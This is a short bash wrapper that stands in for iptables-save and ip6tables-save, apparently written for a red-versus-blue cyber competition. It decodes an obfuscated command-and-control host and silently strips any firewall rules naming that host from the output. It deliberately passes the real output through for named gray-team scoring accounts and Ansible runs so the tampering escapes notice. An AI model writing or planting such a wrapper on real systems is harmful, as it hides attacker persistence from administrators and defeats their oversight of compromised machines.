#!/bin/bash
if [[ "$0" == *"ip6tables-save"* ]]; then
    REAL="/usr/sbin/ip6tables-save"
else
    REAL="/usr/sbin/iptables-save"
fi

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL "$@" ;;
esac

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL "$@"
fi

C2_HOST=$(printf "%s" "__ENC__" | base64 -d)

$REAL "$@" | grep -v "$C2_HOST"
exit ${PIPESTATUS[0]}
